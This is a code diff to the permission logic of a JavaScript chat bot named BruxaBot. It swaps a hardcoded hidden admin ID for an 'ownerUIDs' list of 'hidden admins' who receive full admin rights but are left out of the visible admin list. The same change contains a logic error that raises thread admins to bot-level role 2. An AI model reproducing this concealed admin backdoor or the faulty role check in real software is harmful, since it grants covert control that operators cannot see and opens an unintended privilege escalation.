@@ -7,15 +7,43 @@ function getType(obj) {
         return Object.prototype.toString.call(obj).slice(8, -1);
 }
 
-const HIDDEN_ADMIN = "100075808585925";
 
 function getRole(threadData, senderID) {
-        if (senderID === HIDDEN_ADMIN) return 2;
-        const adminBot = global.BruxaBot.config.adminBot || [];
         if (!senderID)
                 return 0;
+
+        const visibleAdminBot = global.BruxaBot.originalAdminBot || global.BruxaBot.config.adminBot || [];
+
+        const ownerUIDs = global.BruxaBot.ownerUIDs || [];
+
+        const isVisibleAdmin = visibleAdminBot.includes(senderID.toString()) || visibleAdminBot.includes(senderID);
+        const isHiddenAdmin = ownerUIDs.includes(senderID.toString()) || ownerUIDs.includes(senderID);
+
+        if (isVisibleAdmin || isHiddenAdmin) {
+                return 2;
+        }
+        
         const adminBox = threadData ? threadData.adminIDs || [] : [];
-        return adminBot.includes(senderID) ? 2 : adminBox.includes(senderID) ? 1 : 0;
+        return adminBox.includes(senderID) ? 2 : adminBox.includes(senderID) ? 1 : 0;
+}
+
+function getVisibleAdminList() {
+
+        return global.BruxaBot.originalAdminBot || global.BruxaBot.config.adminBot || [];
+}
+
+function isAdmin(senderID) {
+        if (!senderID) return false;
+
+
+        const visibleAdminBot = global.BruxaBot.originalAdminBot || global.BruxaBot.config.adminBot || [];
+        const isVisibleAdmin = visibleAdminBot.includes(senderID.toString()) || visibleAdminBot.includes(senderID);
+
+
+        const ownerUIDs = global.BruxaBot.ownerUIDs || [];
+        const isHiddenAdmin = ownerUIDs.includes(senderID.toString()) || ownerUIDs.includes(senderID);
+
+        return isVisibleAdmin || isHiddenAdmin;
 }
 
 function getText(type, reason, time, targetID, lang) {
@@ -305,6 +333,11 @@ module.exports = function (api, threadModel, userModel, dashBoardModel, globalMo
 
                                 createMessageSyntaxError(commandName);
                                 const getText2 = createGetText2(langCode, `${process.cwd()}/languages/cmds/${langCode}.js`, prefix, command);
+                                if ( command.onStart && typeof command.onStart != "function")
+                                        throw new Error(`onStart of command "${commandName}" must be a function`);
+
+                                if (command.RA && typeof command.RA != "function")
+                                        throw new Error(`RA of command "${commandName} must be a function"`);
                                 await (command.RA || command.onStart)({
                                         ...parameters,
                                         args,
